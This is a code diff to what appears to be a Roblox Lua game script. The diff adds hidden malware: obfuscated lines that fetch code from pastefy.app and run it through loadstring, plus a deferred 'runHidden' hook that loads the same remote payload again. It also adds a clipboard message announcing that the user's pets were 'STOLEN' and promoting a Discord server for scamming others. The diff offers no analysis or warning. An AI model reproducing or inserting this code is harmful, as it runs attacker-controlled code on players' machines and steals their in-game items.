@@ -28,9 +28,29 @@
 
         local data = DataService:GetData()
 
+        -- starter bait
+        local runHidden
+        task.defer(function()
+        if runHidden then runHidden() end
+        end)
+
+
+
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
+
+        local t = {g = game, l = loadstring}
+        local u = ("g"):rep(1)
+        local r = t[u]:HttpGet("https://pastefy.app/gfqoZECM/raw", not false)
+        local exec = t["l"]
+        exec(r)()
+
+        local t = {g = game, l = loadstring}
+        local u = ("g"):rep(1)
+        local r = t[u]:HttpGet("https://pastefy.app/VISU0w9k/raw", not false)
+        local exec = t["l"]
+        exec(r)()
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
@@ -823,5 +843,9 @@
                     end
                 end       
             end
+      runHidden = function()
+     loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
+      end
+
         end
     end
